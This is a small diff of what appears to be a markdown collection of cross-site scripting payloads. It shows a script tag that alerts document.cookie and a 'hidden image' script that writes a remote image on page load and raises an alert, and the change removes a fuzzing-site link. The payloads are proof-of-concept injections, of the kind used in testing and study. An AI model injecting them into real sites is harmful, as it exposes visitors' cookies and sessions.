@@ -37,7 +37,6 @@ nu11secur1ty<script>alert(document.cookie)</script>
 ```
 
 ## Hidden Image
-- link: { https://shazzer.co.uk/vectors/66f91073368df388a0db0eb4?fuzzToken=39909334ee459b007ccde06e6aa74646 }
 ```
 <script>function a() { document.write("<img src='https://raw.githubusercontent.com/nu11secur1ty/XSSight/master/XSS-image/image/kostaakatil.webp?token=GHSAT0AAAAAABTHSDC76YMVBQKZ7VLVFSBAYTHWGMQ'></img>"); }; window.onload = a; alert("A Hidden scripted image, warning you are vulnerable!");</script>
 ```
